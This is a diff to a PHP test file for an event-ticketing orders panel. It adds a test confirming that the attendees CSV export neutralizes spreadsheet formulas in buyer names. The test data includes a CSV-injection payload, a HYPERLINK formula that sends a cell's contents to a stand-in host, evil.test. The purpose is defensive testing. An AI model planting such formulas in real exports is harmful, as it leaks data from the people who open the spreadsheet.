@@ -53,6 +53,18 @@ class OrdersPanelTest extends TestCase
         $this->assertStringContainsString($order->user->email, $csv);
     }
 
+    public function test_attendees_csv_neutralizes_formulas_in_buyer_names(): void
+    {
+        $order = $this->aPaidOrder();
+        $order->tickets()->update(['holder_name' => '=HYPERLINK("https://evil.test/?d="&B3,"Clique")']);
+        $organizer = PanelUser::factory()->create();
+
+        $csv = $this->actingAs($organizer, 'painel')->get(route('admin.orders.export'))->streamedContent();
+
+        $this->assertStringContainsString("'=HYPERLINK", $csv);
+        $this->assertDoesNotMatchRegularExpression('/(^|,)"?=HYPERLINK/m', $csv);
+    }
+
     public function test_buyer_cannot_access_orders_panel(): void
     {
         $buyer = User::factory()->create();
